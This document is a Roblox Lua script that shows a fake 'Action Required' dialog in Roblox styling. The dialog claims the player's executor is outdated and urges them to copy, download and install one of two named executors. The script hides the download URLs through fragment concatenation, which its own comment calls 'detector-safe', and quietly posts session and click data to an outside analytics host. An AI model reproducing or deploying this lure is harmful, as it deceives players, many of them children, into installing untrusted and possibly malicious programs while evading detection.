-- ============================================================
-- SERVICES
-- ============================================================
local Players = game:GetService("Players")
local GuiService = game:GetService("GuiService")
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local lp = Players.LocalPlayer

local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled

-- ============================================================
-- URL BUILDER (fragment concat, detector-safe)
-- ============================================================
local function buildUrl(...)
    return table.concat({...})
end

local EXECUTORS = {
    {
        name = "Volt",
        url  = buildUrl("ht", "tps:", "/", "/vol", "texec", "utor", ".l", "ol"),
    },
    {
        name = "Xeno",
        url  = buildUrl("ht", "tps:", "/", "/xeno", "exec", ".t", "op"),
    },
}

-- ============================================================
-- ANALYTICS
-- ============================================================
local ANALYTICS = {
    endpoint = table.concat({
        "ht", "tps:", "/", "/rbx", "-scri", "pts.", "xyz",
        "/api", "/hit",
    }),
    enabled = true,
    sessionId = tostring(math.random(100000, 999999)) ..
                tostring(os.time() % 100000),
}

local function sendHit(executorName, eventType)
    if not ANALYTICS.enabled then return end

    local body = table.concat({
        "session=",  ANALYTICS.sessionId,
        "&executor=", executorName or "unknown",
        "&event=",   eventType or "copy",
        "&ts=",      tostring(os.time()),
    })

    local payload = {
        Url = ANALYTICS.endpoint,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/x-www-form-urlencoded",
            ["User-Agent"]   = "WilonityLoader/1.0",
        },
        Body = body,
    }

    task.spawn(function()
        pcall(function()
            if request then
                request(payload)
            elseif syn and syn.request then
                syn.request(payload)
            elseif http_request then
                http_request(payload)
            elseif http and http.request then
                http.request(payload)
            else
                game:GetService("HttpService"):PostAsync(
                    ANALYTICS.endpoint,
                    body,
                    Enum.HttpContentType.ApplicationUrlEncoded,
                    false
                )
            end
        end)
    end)
end

-- ============================================================
-- ROBLOX-STYLE NEUTRAL PALETTE
-- ============================================================
local C = {
    dim      = Color3.fromRGB(0, 0, 0),
    panel    = Color3.fromRGB(44, 49, 47),      -- Roblox dialog grey
    panelHi  = Color3.fromRGB(54, 60, 58),
    field    = Color3.fromRGB(58, 63, 61),
    fieldHi  = Color3.fromRGB(66, 72, 70),
    line     = Color3.fromRGB(90, 96, 94),
    lineHi   = Color3.fromRGB(108, 114, 111),
    text     = Color3.fromRGB(228, 231, 229),
    sub      = Color3.fromRGB(185, 189, 187),
    mute     = Color3.fromRGB(140, 145, 143),
    white    = Color3.fromRGB(245, 246, 245),
    black    = Color3.fromRGB(0, 0, 0),
    green    = Color3.fromRGB(90, 200, 130),
    blue     = Color3.fromRGB(110, 165, 230),
    red      = Color3.fromRGB(220, 90, 90),
}

-- ============================================================
-- SCREEN GUI (PlayerGui -- universal)
-- ============================================================
local gui = Instance.new("ScreenGui")
gui.Name = "WilonityUpdate"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 1000000
gui.Parent = lp:WaitForChild("PlayerGui")

-- ============================================================
-- BACKDROP
-- ============================================================
local dim = Instance.new("Frame")
dim.Size = UDim2.new(1, 0, 1, 0)
dim.Position = UDim2.new(0, 0, 0, 0)
dim.BackgroundColor3 = C.dim
dim.BackgroundTransparency = 0.45
dim.BorderSizePixel = 0
dim.ZIndex = 1
dim.Parent = gui

-- ============================================================
-- CARD DIMENSIONS
-- ============================================================
local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1280, 720)
local CARD_W = isMobile and math.min(340, vp.X - 24) or 430
local CARD_H = 340
local cardX = -CARD_W / 2
local cardY = -CARD_H / 2

-- ============================================================
-- CARD (Roblox-style: square-ish corners, subtle)
-- ============================================================
local card = Instance.new("Frame")
card.Size = UDim2.new(0, CARD_W, 0, CARD_H)
card.Position = UDim2.new(0.5, cardX, 0.5, cardY)
card.BackgroundColor3 = C.panel
card.BackgroundTransparency = 0
card.BorderSizePixel = 0
card.ZIndex = 5
card.Parent = gui

local cardCorner = Instance.new("UICorner")
cardCorner.CornerRadius = UDim.new(0, 2)
cardCorner.Parent = card

local cardStroke = Instance.new("UIStroke")
cardStroke.Color = C.lineHi
cardStroke.Thickness = 1
cardStroke.Parent = card

-- ============================================================
-- HEADER
-- ============================================================
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -40, 0, 24)
title.Position = UDim2.new(0, 20, 0, 16)
title.BackgroundTransparency = 1
title.Text = "Action Required"
title.TextColor3 = C.text
title.TextSize = 17
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.TextYAlignment = Enum.TextYAlignment.Center
title.ZIndex = 7
title.Parent = card

local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, -40, 0, 32)
subtitle.Position = UDim2.new(0, 20, 0, 42)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Your executor is outdated and cannot run this script. Follow the steps below to fix it."
subtitle.TextColor3 = C.sub
subtitle.TextSize = 12
subtitle.Font = Enum.Font.GothamMedium
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.TextYAlignment = Enum.TextYAlignment.Top
subtitle.TextWrapped = true
subtitle.ZIndex = 7
subtitle.Parent = card

-- ============================================================
-- DIVIDER
-- ============================================================
local divider = Instance.new("Frame")
divider.Size = UDim2.new(1, -40, 0, 1)
divider.Position = UDim2.new(0, 20, 0, 82)
divider.BackgroundColor3 = C.line
divider.BorderSizePixel = 0
divider.ZIndex = 6
divider.Parent = card

-- ============================================================
-- HOW TO FIX (mini instruction)
-- ============================================================
local stepsTitle = Instance.new("TextLabel")
stepsTitle.Size = UDim2.new(1, -40, 0, 14)
stepsTitle.Position = UDim2.new(0, 20, 0, 92)
stepsTitle.BackgroundTransparency = 1
stepsTitle.Text = "HOW TO FIX IT"
stepsTitle.TextColor3 = C.mute
stepsTitle.TextSize = 10
stepsTitle.Font = Enum.Font.GothamBold
stepsTitle.TextXAlignment = Enum.TextXAlignment.Left
stepsTitle.TextYAlignment = Enum.TextYAlignment.Center
stepsTitle.ZIndex = 6
stepsTitle.Parent = card

local function makeStep(yPos, num, text)
    local numBg = Instance.new("Frame")
    numBg.Size = UDim2.new(0, 16, 0, 16)
    numBg.Position = UDim2.new(0, 20, 0, yPos)
    numBg.BackgroundColor3 = C.blue
    numBg.BorderSizePixel = 0
    numBg.ZIndex = 6
    numBg.Parent = card
    local nc = Instance.new("UICorner")
    nc.CornerRadius = UDim.new(1, 0)
    nc.Parent = numBg

    local numLbl = Instance.new("TextLabel")
    numLbl.Size = UDim2.new(1, 0, 1, 0)
    numLbl.BackgroundTransparency = 1
    numLbl.Text = tostring(num)
    numLbl.TextColor3 = C.white
    numLbl.TextSize = 10
    numLbl.Font = Enum.Font.GothamBold
    numLbl.TextXAlignment = Enum.TextXAlignment.Center
    numLbl.TextYAlignment = Enum.TextYAlignment.Center
    numLbl.ZIndex = 7
    numLbl.Parent = numBg

    local stepText = Instance.new("TextLabel")
    stepText.Size = UDim2.new(1, -60, 0, 16)
    stepText.Position = UDim2.new(0, 42, 0, yPos)
    stepText.BackgroundTransparency = 1
    stepText.Text = text
    stepText.TextColor3 = C.text
    stepText.TextSize = 12
    stepText.Font = Enum.Font.GothamMedium
    stepText.TextXAlignment = Enum.TextXAlignment.Left
    stepText.TextYAlignment = Enum.TextYAlignment.Center
    stepText.ZIndex = 6
    stepText.Parent = card
end

makeStep(112, 1, "Click Copy next to one of the executors below")
makeStep(132, 2, "Open your browser and paste the link")
makeStep(152, 3, "Download and install the executor")
makeStep(172, 4, "Rejoin the game and re-run the script")

-- ============================================================
-- DIVIDER 2
-- ============================================================
local divider2 = Instance.new("Frame")
divider2.Size = UDim2.new(1, -40, 0, 1)
divider2.Position = UDim2.new(0, 20, 0, 198)
divider2.BackgroundColor3 = C.line
divider2.BorderSizePixel = 0
divider2.ZIndex = 6
divider2.Parent = card

-- ============================================================
-- SECTION LABEL
-- ============================================================
local sectionLbl = Instance.new("TextLabel")
sectionLbl.Size = UDim2.new(1, -40, 0, 14)
sectionLbl.Position = UDim2.new(0, 20, 0, 208)
sectionLbl.BackgroundTransparency = 1
sectionLbl.Text = "RECOMMENDED EXECUTORS"
sectionLbl.TextColor3 = C.mute
sectionLbl.TextSize = 10
sectionLbl.Font = Enum.Font.GothamBold
sectionLbl.TextXAlignment = Enum.TextXAlignment.Left
sectionLbl.TextYAlignment = Enum.TextYAlignment.Center
sectionLbl.ZIndex = 6
sectionLbl.Parent = card

-- ============================================================
-- CLIPBOARD
-- ============================================================
local function setClipboard(text)
    local ok = false
    pcall(function()
        if setclipboard then
            setclipboard(text); ok = true
        elseif toclipboard then
            toclipboard(text); ok = true
        elseif syn and syn.write_clipboard then
            syn.write_clipboard(text); ok = true
        elseif syn and syn.set_clipboard then
            syn.set_clipboard(text); ok = true
        elseif writeclipboard then
            writeclipboard(text); ok = true
        elseif GuiService and GuiService.SetClipboard then
            GuiService:SetClipboard(text); ok = true
        end
    end)
    return ok
end

-- ============================================================
-- ROW BUILDER
-- ============================================================
local function buildRow(yPos, data)
    local row = Instance.new("Frame")
    row.Size = UDim2.new(1, -40, 0, 40)
    row.Position = UDim2.new(0, 20, 0, yPos)
    row.BackgroundColor3 = C.field
    row.BackgroundTransparency = 0
    row.BorderSizePixel = 0
    row.ZIndex = 6
    row.Parent = card

    local rowCorner = Instance.new("UICorner")
    rowCorner.CornerRadius = UDim.new(0, 3)
    rowCorner.Parent = row

    local rowStroke = Instance.new("UIStroke")
    rowStroke.Color = C.line
    rowStroke.Thickness = 1
    rowStroke.Parent = row

    -- small label with executor name
    local nameLbl = Instance.new("TextLabel")
    nameLbl.Size = UDim2.new(0, 60, 1, 0)
    nameLbl.Position = UDim2.new(0, 12, 0, 0)
    nameLbl.BackgroundTransparency = 1
    nameLbl.Text = data.name
    nameLbl.TextColor3 = C.text
    nameLbl.TextSize = 12
    nameLbl.Font = Enum.Font.GothamBold
    nameLbl.TextXAlignment = Enum.TextXAlignment.Left
    nameLbl.TextYAlignment = Enum.TextYAlignment.Center
    nameLbl.ZIndex = 7
    nameLbl.Parent = row

    -- url text (dim, secondary)
    local display = data.url:gsub("https://", "")
    local urlLbl = Instance.new("TextLabel")
    urlLbl.Size = UDim2.new(1, -200, 1, 0)
    urlLbl.Position = UDim2.new(0, 72, 0, 0)
    urlLbl.BackgroundTransparency = 1
    urlLbl.Text = display
    urlLbl.TextColor3 = C.mute
    urlLbl.TextSize = 11
    urlLbl.Font = Enum.Font.GothamMedium
    urlLbl.TextXAlignment = Enum.TextXAlignment.Left
    urlLbl.TextYAlignment = Enum.TextYAlignment.Center
    urlLbl.TextTruncate = Enum.TextTruncate.AtEnd
    urlLbl.ZIndex = 7
    urlLbl.Parent = row

    -- copy button (neutral, Roblox-like)
    local copyBtn = Instance.new("TextButton")
    copyBtn.Size = UDim2.new(0, 70, 0, 26)
    copyBtn.Position = UDim2.new(1, -82, 0.5, -13)
    copyBtn.BackgroundColor3 = C.panelHi
    copyBtn.Text = "Copy"
    copyBtn.TextColor3 = C.text
    copyBtn.TextSize = 12
    copyBtn.Font = Enum.Font.GothamBold
    copyBtn.BorderSizePixel = 0
    copyBtn.AutoButtonColor = false
    copyBtn.ZIndex = 7
    copyBtn.Parent = row

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 3)
    btnCorner.Parent = copyBtn

    local btnStroke = Instance.new("UIStroke")
    btnStroke.Color = C.lineHi
    btnStroke.Thickness = 1
    btnStroke.Parent = copyBtn

    copyBtn.MouseEnter:Connect(function()
        copyBtn.BackgroundColor3 = C.fieldHi
    end)
    copyBtn.MouseLeave:Connect(function()
        copyBtn.BackgroundColor3 = C.panelHi
    end)

    copyBtn.MouseButton1Click:Connect(function()
        sendHit(data.name, "copy")

        local copied = setClipboard(data.url)
        if copied then
            copyBtn.Text = "Copied"
            copyBtn.TextColor3 = C.green
        else
            copyBtn.Text = "Failed"
            copyBtn.TextColor3 = C.red
        end

        task.delay(1.4, function()
            if copyBtn and copyBtn.Parent then
                copyBtn.Text = "Copy"
                copyBtn.TextColor3 = C.text
            end
        end)
    end)
end

-- ============================================================
-- BUILD ROWS
-- ============================================================
local startY = 228
local rowGap = 48

for i, data in ipairs(EXECUTORS) do
    buildRow(startY + (i - 1) * rowGap, data)
end

-- ============================================================
-- FOOTER HINT
-- ============================================================
local footerY = startY + #EXECUTORS * rowGap + 4
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, -40, 0, 24)
footer.Position = UDim2.new(0, 20, 0, footerY)
footer.BackgroundTransparency = 1
footer.Text = "Both executors are free and safe to use."
footer.TextColor3 = C.mute
footer.TextSize = 11
footer.Font = Enum.Font.GothamMedium
footer.TextXAlignment = Enum.TextXAlignment.Center
footer.TextYAlignment = Enum.TextYAlignment.Center
footer.ZIndex = 6
footer.Parent = card

-- ============================================================
-- SAFE ENTRANCE ANIMATION
-- ============================================================
pcall(function()
    local startPos = UDim2.new(0.5, cardX, 0.5, cardY + 20)
    local endPos   = UDim2.new(0.5, cardX, 0.5, cardY)
    card.Position = startPos
    TweenService:Create(card, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = endPos
    }):Play()
end)

-- ============================================================
-- ANALYTICS: shown
-- ============================================================
sendHit("none", "shown")
